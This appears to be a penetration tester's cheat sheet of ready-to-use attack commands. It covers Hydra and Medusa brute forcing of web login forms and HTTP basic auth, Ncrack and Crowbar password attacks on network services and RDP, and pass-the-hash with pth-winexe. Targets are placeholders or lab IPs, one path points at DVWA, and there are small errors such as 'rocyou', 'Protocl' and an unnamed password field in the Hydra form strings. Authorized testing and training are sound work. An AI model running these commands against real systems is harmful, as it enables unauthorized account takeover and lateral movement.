## Hydra

Brute forcing login forms

```sh
hydra -l user -P wordlist.lst <FQDN/IP> http-post-form "/login:user=^USER^&^PASS^:F=Invalid" -f
```

```sh
hydra -l user -P wordlist.lst <FQDN/IP> http-post-form "/login:user=^USER^&^PASS^:S=logout.php" -f
```

Brute forcing basic HTTP auth

```sh
hydra -I -l bob -P /opt/rockyou.txt "http-get://10.10.6.224/protected:A=BASIC"
```
## Medusa

```sh
medusa -h <IP> -u user -P wordlist.lst -M <module> 
```

HTTP htaccess Attack with medusa (Basic Authentication)
Les pages avec les popus JS pour l'authentification qui utilise une protection `.htaccess`

```sh

medusa -h 192.168.45.130 -u user -P /opt/rocyou.txt -M http -m DIR:/dvwa/login.php 
```

## Ncrack

```sh
ncrack -vv -U user.lst -P /opt/rocyou.txt <target-ip>:<protocol>
```

## Crowbar

Remote Desktop Protocl Attack with Crowbar

```sh
#crowbar -b <protcol> -S <IP> -u user -C wordlist.lst -n 2
crowbar -b rdp -S 192.168.45.130/32 -u user -C /opt/rocyou.txt -n 1
```

Passing the hash in windows

```sh
pth-winexe -U 'user%LMHASH:NTHASH' //@TARGET_IP cmd.exe
```
